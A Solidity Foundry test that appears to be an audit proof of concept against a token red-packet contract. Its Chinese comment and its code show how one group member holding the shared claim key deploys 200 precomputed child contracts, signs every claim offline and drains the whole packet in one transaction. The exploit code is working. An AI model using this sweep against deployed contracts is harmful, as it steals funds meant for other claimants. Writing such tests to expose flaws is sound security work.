// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {TapeTapeRedPacket} from "../../src/TapeTapeRedPacket.sol";
import {Token} from "../TapeTapeRedPacket.t.sol";

contract Grabber {
    constructor(TapeTapeRedPacket rp, Token t, address creator, string memory id, bytes memory sig, address to) {
        uint256 got = rp.claimRedPacket(creator, id, sig);
        t.transfer(to, got);
    }
}

contract Sweeper {
    function sweep(TapeTapeRedPacket rp, Token t, address creator, string calldata id, bytes[] calldata sigs) external {
        for (uint256 i = 0; i < sigs.length; i++) new Grabber(rp, t, creator, id, sigs[i], msg.sender);
    }
}

/// 已知局限「群成员多钱包可以多领几份」实际是：任何一个拿到领取密钥的群成员，可以用一笔交易把整个红包全部领走，
/// 而且可以抢在所有人前面（领取地址可提前算出、签名离线生成）。
contract OneTxSweep is Test {
    function test_poc_oneMemberSweepsWholePacketInOneTx() public {
        TapeTapeRedPacket rp = new TapeTapeRedPacket(address(this), 5);
        Token t = new Token(18);
        address alice = address(0xA11CE);
        uint256 keyPk = 0xC1A1; // 群里每个人都有这把领取私钥
        t.mint(alice, 1000e18);
        vm.startPrank(alice);
        t.approve(address(rp), type(uint256).max);
        rp.createRedPacket("group-1", address(t), 1000e18, 200, vm.addr(keyPk), address(0), 5);
        vm.stopPrank();

        address mallory = address(0x3A11);
        vm.prank(mallory);
        Sweeper sw = new Sweeper();
        bytes[] memory sigs = new bytes[](200);
        for (uint256 i = 0; i < 200; i++) {
            address child = vm.computeCreateAddress(address(sw), i + 1);
            bytes32 d = MessageHashUtils.toEthSignedMessageHash(rp.claimDigest(alice, "group-1", child));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(keyPk, d);
            sigs[i] = abi.encodePacked(r, s, v);
        }
        vm.prank(mallory);
        uint256 g = gasleft();
        sw.sweep(rp, t, alice, "group-1", sigs);
        console2.log("gas for sweeping 200 shares in one tx", g - gasleft());
        assertEq(t.balanceOf(mallory), 1000e18 - 5e18, "mallory took every share");
        assertEq(rp.getRedPacketInfo(alice, "group-1").remainCount, 0);
    }
}
